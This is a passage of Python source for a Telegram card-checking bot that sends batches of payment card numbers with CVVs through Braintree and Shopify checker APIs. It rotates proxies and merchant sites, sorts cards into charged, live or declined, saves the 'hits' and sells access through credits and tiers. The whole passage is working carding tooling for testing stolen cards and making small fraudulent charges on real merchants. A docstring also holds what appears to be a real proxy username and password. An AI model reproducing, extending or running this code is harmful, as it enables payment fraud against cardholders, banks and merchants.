                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
                f"<b>Time</b> ➛ {time_str}"
            )
            try:
                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
            except Exception as e:
                if "message is not modified" not in str(e).lower():
                    print(f"⚠️ Progress update error: {e}")
        
        async def process_single_card(card: str, idx: int):
            nonlocal processed_count, proxy_index
            
            async with semaphore:
                # Get proxy for this card
                proxy_str = None
                if user_proxies:
                    proxy_str = user_proxies[proxy_index % len(user_proxies)]
                    proxy_index += 1
                
                await speed_controller.wait_if_needed()
                start = time.time()
                result = await check_card_braintree_auth(card, proxy_str, u_id)
                elapsed = time.time() - start
                speed_controller.record_response(elapsed)
                
                bin_info = await get_bin_info(card)
                status_category = result.get("status_category", "unknown")
                
                async with stats_lock:
                    processed_count += 1
                    
                    if status_category == "approved":
                        stats["approved"] += 1
                        print(f"✅ [APPROVED] {card[:20]}...")
                    elif status_category == "declined":
                        stats["declined"] += 1
                        print(f"❌ [DECLINED] {card[:20]}...")
                    else:
                        stats["declined"] += 1
                        print(f"⚠️ [ERROR - DECLINED] {card[:20]}...")
                    
                    if processed_count % 5 == 0 or processed_count == total:
                        await update_progress(processed_count)
                
                # Only send approved cards
                if status_category == "approved":
                    ui, _ = format_braintree_auth_response(result, card, bin_info)
                    try:
                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
                        print(f"📤 [SENT] {card[:20]}...")
                    except Exception as e:
                        print(f"❌ Error sending result: {e}")
                    
                    await save_hit_to_file(
                        card=card, gateway="Braintree Auth",
                        response=result.get("message", "Approved"),
                        price="$0.00",
                        bin_info=bin_info, user_id=u_id, user_tier=tier
                    )
                    
                    user_data = user_manager.get_user(u_id)
                    await send_hit_notification(
                        context=context, gateway="Braintree Auth", card=card,
                        response=result.get("message", "Approved"),
                        price="$0.00",
                        user=user_data, bin_info=bin_info, status_category="approved"
                    )
                    user_manager.increment_hits(u_id)
                
                user_manager.increment_checks(u_id, 1)
                return result, card
        
        # Process cards in batches
        for batch_start in range(0, total, BATCH_SIZE):
            if u_id not in braintree_auth_active_tasks:
                break
            
            batch_end = min(batch_start + BATCH_SIZE, total)
            batch_cards = cards[batch_start:batch_end]
            
            tasks = []
            for idx, card in enumerate(batch_cards, batch_start):
                task = asyncio.create_task(process_single_card(card, idx))
                tasks.append(task)
            
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in batch_results:
                if isinstance(result, Exception):
                    print(f"❌ Batch task error: {result}")
                    async with stats_lock:
                        stats["declined"] += 1
                        stats["processed"] += 1
            
            # Small delay between batches
            if batch_end < total:
                await asyncio.sleep(0.5)
        
        # Final summary
        if u_id in braintree_auth_active_tasks:
            total_time = time.time() - start_time
            minutes = int(total_time // 60)
            seconds = int(total_time % 60)
            
            skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
            
            summary = (
                f"{skull_emoji} <b>Braintree Auth Mass Check Complete</b>\n\n"
                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} (Hidden)\n"
                f"{errors_emoji} <b>Errors</b> ➛ 0\n"
                f"📝 <b>Total</b> ➛ {total}\n"
                f"⏱️ <b>Time</b> ➛ {minutes}m {seconds}s\n"
                f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
            )
            
            await update_progress(total)
            await message.reply_text(summary, parse_mode=ParseMode.HTML)
            print(f"📊 Final summary sent to user {u_id}")
        
        return stats
        
    except Exception as e:
        print(f"❌ Braintree Auth mass check error: {e}")
        traceback.print_exc()
        try:
            if progress_msg:
                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
            else:
                await message.reply_text(f"❌ Error: {str(e)[:100]}")
        except:
            pass
    finally:
        braintree_auth_active_tasks.pop(u_id, None)
        print(f"🏁 [Braintree Auth Mass] Session ended for user {u_id}")

# ============ SHOPIFY SINGLE CHECK GATEWAY (AUTOSOPI MAIN API) ============

# Get all sites from autosopi_site_manager
def get_all_working_sites():
    """Get all sites from Autosopi site manager, excluding dead ones"""
    sites = []
    for site in autosopi_site_manager.sites:
        # Skip sites marked as dead (3+ failures)
        if autosopi_site_manager.site_failures.get(site, 0) < 3:
            sites.append(site)
    
    # If no working sites, use all sites
    if not sites:
        sites = autosopi_site_manager.sites.copy()
    
    return sites

SH_GATEWAY_PRICE = "0.25"
SH_GATEWAY_GATEWAY = "Shopify Payments"

def format_proxy_for_autoshopify(proxy: str) -> Optional[str]:
    """
    Format proxy for AutoShopify API
    Expected format: host:port:user:pass
    Example: px019603.pointtoserver.com:10780:purevpn0s13918563:fV21iqc3trwCAs
    
    Handles all input formats:
    - host:port:user:pass (already correct)
    - user:pass@host:port
    - user:pass:host:port
    - ip:port (no auth)
    - http://user:pass@host:port (with protocol)
    """
    if not proxy:
        return None
    
    original_proxy = proxy
    
    try:
        # Step 1: Remove any protocol prefixes
        proxy = re.sub(r'^(http|https|socks4|socks5)://', '', proxy)
        
        # Step 2: Check if already in correct format (host:port:user:pass)
        parts = proxy.split(':')
        if len(parts) == 4:
            # Check if second part is port (digits) -> host:port:user:pass
            if parts[1].isdigit():
                # Already in correct format!
                print(f"✅ [AutoShopify Proxy] Using as-is: {proxy[:50]}...")
                return proxy
            else:
                # Format: user:pass:host:port - needs conversion
                user, password, host, port = parts
                if port.isdigit():
                    result = f"{host}:{port}:{user}:{password}"
                    print(f"✅ [AutoShopify Proxy] Converted user:pass:host:port -> {result[:50]}...")
                    return result
        
        # Step 3: Handle @ format (user:pass@host:port)
        if '@' in proxy:
            auth, hostport = proxy.split('@', 1)
            if ':' in auth and ':' in hostport:
                user, password = auth.split(':', 1)
                host, port = hostport.split(':', 1)
                result = f"{host}:{port}:{user}:{password}"
                print(f"✅ [AutoShopify Proxy] Converted @ format -> {result[:50]}...")
                return result
        
        # Step 4: host:port only (no authentication)
        if len(parts) == 2 and parts[1].isdigit():
            print(f"⚠️ [AutoShopify Proxy] Proxy without auth: {proxy}")
            return proxy
        
        # Step 5: Try to extract using pattern matching
        # Look for pattern: host:port followed by user:pass
        match = re.search(r'([a-zA-Z0-9\.-]+):(\d+)[:@]?([a-zA-Z0-9]+):([a-zA-Z0-9]+)', proxy)
        if match:
            host, port, user, password = match.groups()
            result = f"{host}:{port}:{user}:{password}"
            print(f"✅ [AutoShopify Proxy] Extracted via regex -> {result[:50]}...")
            return result
        
        print(f"⚠️ [AutoShopify Proxy] Could not parse: {original_proxy[:50]}...")
        return None
        
    except Exception as e:
        print(f"⚠️ [AutoShopify Proxy] Error parsing {original_proxy[:50]}: {e}")
        return None

async def check_card_shopify_single(card: str, proxy: str = None, site_list: list = None, site_index: int = 0, retry_count: int = 0) -> Dict:
    """
    Check card using Autosopi MAIN API with site rotation and 1-time retry for TOKENIZE_FAIL
    """
    # Get all working sites if not provided
    if site_list is None:
        site_list = get_all_working_sites()
    
    if site_index >= len(site_list):
        return {
            "status": "error",
            "result": "ALL_SITES_DEAD",
            "message": "All sites are currently down",
            "status_display": "⚠️ ALL SITES DEAD",
            "status_category": "error",
            "elapsed": 0
        }
    
    site_url = site_list[site_index]
    
    print(f"\n{'='*80}")
    print(f"💳 [SHOPIFY SINGLE GATEWAY] Checking card: {card[:20]}...")
    print(f"📍 Site: {site_url} (attempt {site_index + 1}/{len(site_list)})")
    print(f"💰 Price: ${SH_GATEWAY_PRICE}")
    if proxy:
        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
    if retry_count > 0:
        print(f"🔄 RETRY ATTEMPT #{retry_count}")
    print(f"{'='*80}")
    
    try:
        # Parse card for validation
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
                "status_display": "⚠️ INVALID FORMAT",
                "status_category": "error"
            }
        
        card_num, month, year, cvv = parts
        
        # Format year to 4 digits for TEAMOICX API
        if len(year) == 2:
            year_4digit = f"20{year}"
        else:
            year_4digit = year
        
        # Format card for API
        formatted_card = f"{card_num}|{month}|{year_4digit}|{cvv}"
        
        # Format proxy for TEAMOICX API properly
        proxy_param = None
        if proxy:
            proxy_param = format_proxy_for_teamoicx(proxy)
            if proxy_param:
                print(f"🔍 TEAMOICX API using proxy: {proxy_param[:50]}...")
            else:
                print(f"⚠️ Could not format proxy, continuing without proxy")
        
        # Prepare site URL
        if not site_url.startswith(('http://', 'https://')):
            full_site_url = f"https://{site_url}"
        else:
            full_site_url = site_url
        
        # Make request to TEAMOICX MAIN API
        start_time = time.time()
        
        async with httpx.AsyncClient(timeout=httpx.Timeout(120.0, connect=30.0, read=110.0), verify=False) as client:
            params = {
                "cc": formatted_card,
                "url": full_site_url
            }
            if proxy_param:
                params["proxy"] = proxy_param
            
            response = await client.get(
                TEAMOICX_API,
                params=params,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "application/json"
                },
                timeout=httpx.Timeout(120.0, connect=30.0, read=110.0),
                follow_redirects=True
            )
        
        elapsed = time.time() - start_time
        
        print(f"📥 Response time: {elapsed:.2f}s")
        print(f"📊 Status code: {response.status_code}")
        
        if response.status_code == 200:
            try:
                data = response.json()
                print(f"✅ Response: {json.dumps(data, indent=2)}")
                
                # Extract response data
                response_text = data.get("response") or data.get("message") or data.get("status") or data.get("Response") or "UNKNOWN"
                gateway = data.get("gateway") or data.get("Gate") or SH_GATEWAY_GATEWAY
                
                # ============ SIMPLE 1-TIME RETRY FOR TOKENIZE_FAIL ============
                # Check if this is TOKENIZE_FAIL and we haven't retried yet
                if "TOKENIZE_FAIL" in response_text and retry_count == 0:
                    print(f"⚠️ TOKENIZE_FAIL detected! Will retry once.")
                    
                    # Try next site for retry
                    next_site_index = site_index + 1
                    
                    # Wait 2 seconds before retry
                    await asyncio.sleep(2)
                    
                    # Retry with same proxy but next site
                    return await check_card_shopify_single(
                        card, proxy, site_list, next_site_index, retry_count=1
                    )
                
                # Check for site dead
                if "SITE DEAD" in response_text:
                    print(f"⚠️ Site {site_url} is DEAD, trying next site...")
                    autosopi_site_manager.mark_site_result(site_url, False, is_site_dead=True)
                    await asyncio.sleep(1)
                    return await check_card_shopify_single(card, proxy, site_list, site_index + 1, retry_count)
                
                # Determine status based on response
                response_upper = response_text.upper()
                
                # Charged patterns
                charged_patterns = ["CHARGED", "ORDER COMPLETED", "SUCCESS", "PAID", "COMPLETED", "ORDER_PLACED",]
                is_charged = any(pattern in response_upper for pattern in charged_patterns)
                
                # OTP/3D patterns
                otp_patterns = ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS"]
                is_otp = any(pattern in response_upper for pattern in otp_patterns)
                
                # Insufficient funds patterns
                insufficient_patterns = ["INSUFFICIENT", "FUNDS", "INSUFFICIENT_FUNDS"]
                is_insufficient = any(pattern in response_upper for pattern in insufficient_patterns)
                
                # Decline patterns
                decline_patterns = ["DECLINED", "CARD DECLINED", "REJECTED", "DO NOT HONOR", "GENERIC_ERROR",]
                is_declined = any(pattern in response_upper for pattern in decline_patterns)
                
                if is_charged:
                    status_display = "🔥 CHARGED 🔥"
                    status_category = "charged"
                elif is_otp:
                    status_display = "🔐 3D REQUIRED"
                    status_category = "approved"
                elif is_insufficient:
                    status_display = "💰 INSUFFICIENT FUNDS"
                    status_category = "approved"
                elif is_declined:
                    status_display = "❌ DECLINED"
                    status_category = "declined"
                else:
                    # If still SITE DEAD (should have been caught above)
                    if "SITE DEAD" in response_upper:
                        return await check_card_shopify_single(card, proxy, site_list, site_index + 1, retry_count)
                    status_display = "❌ DECLINED"
                    status_category = "declined"
                
                return {
                    "status": "success" if status_category in ["charged", "approved"] else "declined",
                    "result": status_display,
                    "message": response_text,
                    "status_display": status_display,
                    "status_category": status_category,
                    "elapsed": elapsed,
                    "price": "$1.00",  # Always show $1.00 in result
                    "gateway": gateway,
                    "site": site_url,
                    "proxy_used": proxy
                }
                
            except json.JSONDecodeError as e:
                print(f"⚠️ JSON parse error: {e}")
                return {
                    "status": "error",
                    "result": "JSON_ERROR",
                    "message": "Invalid JSON response",
                    "status_display": "⚠️ JSON ERROR",
                    "status_category": "error",
                    "elapsed": elapsed,
                    "price": "$1.00"
                }
        else:
            print(f"⚠️ HTTP error: {response.status_code}")
            return {
                "status": "error",
                "result": f"HTTP_{response.status_code}",
                "message": f"HTTP Error: {response.status_code}",
                "status_display": f"⚠️ HTTP {response.status_code}",
                "status_category": "error",
                "elapsed": elapsed,
                "price": "$1.00"
            }
            
    except httpx.TimeoutException:
        print(f"⏰ Timeout error on site {site_url}")
        await asyncio.sleep(1)
        return await check_card_shopify_single(card, proxy, site_list, site_index + 1, retry_count)
    except Exception as e:
        print(f"❌ Error: {e}")
        return {
            "status": "error",
            "result": "ERROR",
            "message": str(e)[:100],
            "status_display": "⚠️ ERROR",
            "status_category": "error",
            "price": "$1.00"
        }
        
        
async def check_card_backup_shopify(card: str, site: str, proxy: str = None, user_id: int = None, retry_count: int = 0) -> Dict:
    """
    Backup Shopify API - used when main Autosopi API fails
    FIXED: Proper JSON parsing without double-consuming response body
    """
    print(f"\n{'='*80}")
    print(f"💳 [BACKUP SHOPIFY API] Checking card: {card[:20]}...")
    print(f"📍 Site: {site}")
    if proxy:
        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
    if retry_count > 0:
        print(f"🔄 BACKUP RETRY ATTEMPT #{retry_count}")
    print(f"{'='*80}")
    
    default_result = {
        "status": "error",
        "result": "UNKNOWN_ERROR",
        "message": "Unknown error occurred",
        "status_display": "⚠️ ERROR",
        "status_category": "error",
        "elapsed": 0,
        "price": "0.00",
        "gateway": "Shopify Payments"
    }
    
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format",
                "status_display": "⚠️ INVALID FORMAT",
                "status_category": "error"
            }
        
        card_num, month, year, cvv = parts
        
        if len(year) == 4:
            year_2digit = year[2:]
        else:
            year_2digit = year
        
        formatted_card = f"{card_num}|{month}|{year_2digit}|{cvv}"
        
        if not site.startswith(('http://', 'https://')):
            site_clean = f"https://{site}"
        else:
            site_clean = site
        
        params = {
            "site": site_clean,
            "cc": formatted_card
        }
        
        proxy_param = None
        if proxy:
            proxy_param = format_proxy_for_new_autosopi(proxy)
            if proxy_param:
                params["proxy"] = proxy_param
        
        start_time = time.time()
        
        timeout_seconds = 45.0 if retry_count == 0 else 55.0
        
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(timeout_seconds, connect=15.0, read=timeout_seconds - 10),
            verify=False,
            limits=httpx.Limits(max_keepalive_connections=5, max_connections=10)
        ) as client:
            response = await client.get(
                BACKUP_SHOPIFY_API_ENDPOINT,
                params=params,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "application/json",
                    "Connection": "close"
                },
                follow_redirects=True
            )
        
        elapsed = time.time() - start_time
        print(f"📥 Response time: {elapsed:.2f}s")
        print(f"📊 Status code: {response.status_code}")
        
        if response.status_code == 200:
            # ============ FIXED: Parse JSON directly FIRST ============
            try:
                data = response.json()
            except json.JSONDecodeError as e:
                print(f"⚠️ JSON parse error: {e}")
                raw_preview = response.text[:300] if response.text else "[Empty Response]"
                print(f"📄 Raw response preview: {raw_preview}")
                
                if retry_count < BACKUP_SHOPIFY_MAX_RETRIES:
                    print(f"🔄 JSON error - retrying...")
                    await asyncio.sleep(2)
                    return await check_card_backup_shopify(card, site, proxy, user_id, retry_count + 1)
                default_result["message"] = "Invalid JSON response from backup API"
                default_result["elapsed"] = elapsed
                return default_result
            
            print(f"✅ Backup API Response: {json.dumps(data, indent=2)}")
            
            # Extract response data safely
            response_text = data.get("Response", data.get("response", data.get("message", data.get("status", "UNKNOWN"))))
            gateway = data.get("Gate", data.get("gateway", data.get("Gateway", "Shopify Payments")))
            price = data.get("Price", data.get("price", data.get("amount", "0.00")))
            status = data.get("Status", data.get("success", False))
            
            response_upper = response_text.upper()
            
            # ============ CHECK FOR SITE REMOVAL ERRORS ============
            for removal_error in SITE_REMOVAL_ERRORS:
                if removal_error.upper() in response_upper:
                    print(f"🗑️ BACKUP API SITE REMOVAL: {removal_error} for site {site}")
                    return {
                        "status": "error",
                        "result": removal_error,
                        "message": response_text,
                        "status_display": f"⚠️ SITE REMOVED: {removal_error}",
                        "status_category": "error",
                        "elapsed": elapsed,
                        "price": "0.00",
                        "gateway": gateway,
                        "site_removed": True
                    }
            
            # ============ IMPROVED RESPONSE MAPPING ============
            
            # CHARGED patterns - actual successful charges
            charged_patterns = [
                "CHARGED", "ORDER COMPLETED", "ORDER COMPLETED 💎", "ORDER_PLACED",
                "SUCCESS", "PAID", "COMPLETED", "APPROVED",
                "TRANSACTION_COMPLETED", "CAPTURED"
            ]
            
            # LIVE patterns - card is valid but not charged
            live_patterns = [
                "INSUFFICIENT", "FUNDS", "INSUFFICIENT_FUNDS",
                "CVV LIVE", "INCORRECT_CVV", "CVV_MISMATCH",
                "CARD_VERIFICATION_FAILED", "CARD_ERROR"
            ]
            
            # 3D/OTP patterns
            otp_patterns = [
                "OTP", "3D", "SECURE", "AUTHENTICATION", 
                "3DS", "THREEDS", "OTP_REQUIRED", "3D_SECURE"
            ]
            
            # Decline patterns (card is dead/invalid)
            decline_patterns = [
                "CARD_DECLINED", "DECLINED", "REJECTED", 
                "DO NOT HONOR", "GENERIC_ERROR", "INVALID CARD",
                "EXPIRED CARD", "LOST_CARD", "STOLEN_CARD",
                "RESTRICTED_CARD", "PICKUP_CARD"
            ]
            
            # Error patterns that mean the API/proxy/site failed
            error_patterns = [
                "NO_SESSION_TOKEN", "SITE DEAD", "PROXY DEAD",
                "CONNECTION ERROR", "TIMEOUT", "INVALID SITE URL",
                "SITE NOT FOUND", "CONNECTION REFUSED"
            ]
            
            # Check for error conditions first (API/proxy/site issues)
            if any(p in response_upper for p in error_patterns):
                status_display = "⚠️ API ERROR"
                status_category = "error"
                print(f"⚠️ Backup API error: {response_text}")
                
            # Check for CHARGED
            elif any(p in response_upper for p in charged_patterns):
                status_display = "🔥 CHARGED 🔥"
                status_category = "charged"
                print(f"🔥 Backup API CHARGED detected: {response_text}")
                
            # Check for 3D/OTP
            elif any(p in response_upper for p in otp_patterns):
                status_display = "🔐 3D REQUIRED"
                status_category = "approved"
                print(f"🔐 Backup API 3D REQUIRED: {response_text}")
                
            # Check for LIVE (valid card, just not charged)
            elif any(p in response_upper for p in live_patterns):
                if "INSUFFICIENT" in response_upper:
                    status_display = "💰 INSUFFICIENT FUNDS"
                else:
                    status_display = "✅ CVV LIVE"
                status_category = "approved"
                print(f"✅ Backup API LIVE card: {response_text}")
                
            # Check for DECLINED
            elif any(p in response_upper for p in decline_patterns):
                status_display = "❌ DECLINED"
                status_category = "declined"
                print(f"❌ Backup API DECLINED: {response_text}")
                
            # Check if Status is true but we didn't match any pattern
            elif status is True:
                status_display = "✅ APPROVED"
                status_category = "approved"
                print(f"✅ Backup API Status true: {response_text}")
                
            else:
                status_display = "❌ DECLINED"
                status_category = "declined"
                print(f"⚠️ Backup API unknown response - treating as DECLINED: {response_text}")
            
            # Format price properly
            try:
                price_float = float(price)
                price_str = f"${price_float:.2f}"
            except (ValueError, TypeError):
                price_str = str(price) if price else "$0.00"
            
            # Build result
            result = {
                "status": "success" if status_category in ["charged", "approved"] else "declined",
                "result": response_text,
                "message": response_text,
                "status_display": status_display,
                "status_category": status_category,
                "elapsed": elapsed,
                "price": price_str,
                "gateway": gateway,
                "site": site_clean,
                "proxy_used": proxy,
                "api_used": "backup_shopify_api",
                "retry_count": retry_count
            }
            
            print(f"📊 Backup API final result: status_category={status_category}, status_display={status_display}")
            return result
            
    except httpx.TimeoutException:
        print(f"⏰ Backup API timeout")
        if retry_count < BACKUP_SHOPIFY_MAX_RETRIES:
            print(f"🔄 Timeout - retrying...")
            await asyncio.sleep(2)
            return await check_card_backup_shopify(card, site, proxy, user_id, retry_count + 1)
        default_result["message"] = f"Backup API timeout after {timeout_seconds}s"
        return default_result
    except Exception as e:
        print(f"❌ Backup API error: {e}")
        if retry_count < BACKUP_SHOPIFY_MAX_RETRIES:
            print(f"🔄 Exception - retrying...")
            await asyncio.sleep(2)
            return await check_card_backup_shopify(card, site, proxy, user_id, retry_count + 1)
        default_result["message"] = str(e)[:100]
        return default_result
def format_shopify_single_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format Shopify Single gateway response for display - SHOW ACTUAL PRICE FROM API"""
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    message = result.get("message", "Unknown")
    
    # ============ FIXED: Get actual price from result, not hardcoded ============
    price = result.get("price", "0.00")
    
    # Format price properly
    try:
        price_float = float(price)
        price_str = f"${price_float:.2f}"
    except (ValueError, TypeError):
        price_str = str(price) if price else "$0.00"
    
    elapsed = result.get("elapsed", 0)
    gateway = result.get("gateway", "Shopify Payments")
    proxy_used = result.get("proxy_used", "None")
    
    proxy_display = mask_proxy(proxy_used) if proxy_used and proxy_used != "None" else "None"
    
    
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"⌬ 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
        f"⌬ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
        f"⌬ 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price_str}\n"
        f"⌬ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {message}\n"
        f"⌬ 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"⌬ 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
        f"⌬ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
        f"⌬ 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
    )
    
    return ui, status_category



@check_gateway("shopify")
async def single_check_shopify_pool(update: Update, context: ContextTypes.DEFAULT_TYPE, card: str):
    """
    Single card check using API pool rotation
    Automatically rotates between multiple Shopify APIs
    """
    u_id = update.effective_user.id
    message = update.effective_message
    username = update.effective_user.username or update.effective_user.first_name
    
    # Initialize checking_msg as None at the start
    checking_msg = None
    
    # Check credits
    can_proceed, error_msg = await check_and_deduct_credits(u_id, update, context, is_mass_check=False, card_count=1)
    if not can_proceed:
        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
        return
    
    # Check gateway access
    if not user_manager.can_access_gateway(u_id, 'autosopi'):
        tier = user_manager.get_tier(u_id)
        # FIXED: Combine all text into a single string
        error_message = (
            f" USE /buy TO UPGRADE YOUR TIER 💎\n"
            
        )
        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
        add_user_credits(u_id, 1)
        return
    
    try:
        # Create checking message HERE - inside try block
        checking_msg = await message.reply_text(
            f"{premium_emoji(PREMIUM_EMOJI_IDS['time'], '🔄')} Checking card with Shopify...",
            parse_mode=ParseMode.HTML
        )
        
        tier = user_manager.get_tier(u_id)
        
        # Get a site for this check
        site = autosopi_site_manager.get_next_site_weighted()
        if not site:
            await checking_msg.edit_text("❌ No sites available.")
            return
        
        # Get proxy if allowed
        proxy_str = None
        if user_manager.can_use_proxy(u_id):
            proxy_str = autosopi_proxy_tracker.get_working_proxy(u_id)
        
        # Check using API pool
        result = await shopify_api_pool.check_card_with_pool(card, site, proxy_str, u_id)
        
        elapsed = result.get("elapsed", 0)
        
        # Get BIN info
        bin_info = await get_bin_info(card)
        bin_info_text, bank, country, currency_code, country_code = bin_info
        
        status_display = result.get("status_display", "❌ DECLINED")
        status_category = result.get("status_category", "declined")
        response_msg = result.get("message", "Unknown")
        price = result.get("price", "0.00")
        gateway_name = result.get("gateway", "Shopify Payments")
        api_used = result.get("api_used", "Unknown API")
        
        # Format price
        try:
            price_float = float(price)
            price_str = f"${price_float:.2f}"
        except:
            price_str = price
        
        # Parse card for display
        card_parts = card.split('|')
        card_num = card_parts[0] if len(card_parts) > 0 else card
        exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
        exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
        cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
        
        # Format country with flag
        country_name = country.replace('🌐', '').strip()
        flag_map = {
            'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
            'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
        }
        country_flag = "🌍"
        for key, flag in flag_map.items():
            if key in country_name.upper():
                country_flag = flag
                break
        
        # ============ USE PREMIUM EMOJIS FOR STATUS ============
        if status_category == "charged":
            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
            status_display_clean = "CHARGED"
        elif status_category == "approved":
            if "INSUFFICIENT" in response_msg.upper():
                status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
                status_display_clean = "INSUFFICIENT FUNDS"
            else:
                status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
                status_display_clean = "APPROVED"
        else:
            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
            status_display_clean = "DECLINED"
        
        # Build output with Premium emojis
        output = (
            f"┏━━━━━━━⍟\n"
            f"┃ {status_emoji} {status_display_clean}\n"
            f"┗━━━━━━━━━━━⊛\n\n"
            f"⌬ 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year}|{cvv}</code>\n"
            f"⌬ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway_name}\n"
            f"⌬ 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price_str}\n"
            f"⌬ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_msg[:100]}\n"
            f"⌬ 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
            f"⌬ 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
            f"⌬ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
            f"⌬ 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
        )
        
        # Delete checking message and send result
        if checking_msg:
            try:
                await checking_msg.delete()
            except:
                pass
        
        await message.reply_text(output, parse_mode=ParseMode.HTML)
        
        # Save hit if approved/charged
        if status_category in ["charged", "approved"]:
            await save_hit_to_file(
                card=card, gateway=gateway_name,
                response=response_msg, price=price_str,
                bin_info=bin_info, user_id=u_id, user_tier=tier
            )
            
            if status_category == "charged":
                await send_gif_with_result_combined(
                    update=update, context=context, card=card,
                    gateway="shopify", response=response_msg,
                    price=price_str, bin_info=bin_info,
                    status_category="charged", username=username
                )
                
                user_data = user_manager.get_user(u_id)
                await send_hit_notification(
                    context=context, gateway=gateway_name,
                    card=card, response=response_msg, price=price_str,
                    user=user_data, bin_info=bin_info, status_category="charged"
                )
                
                user_manager.increment_hits(u_id)
        
        user_manager.increment_checks(u_id)
        
    except Exception as e:
        # SAFE: Only try to delete/update checking_msg if it was created
        if checking_msg:
            try:
                await checking_msg.delete()
            except:
                pass
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ [Shopify Pool] Error: {traceback.format_exc()}")
        add_user_credits(u_id, 1)
    finally:
        if u_id in shopify_active_tasks:
            shopify_active_tasks.pop(u_id, None)
            
            
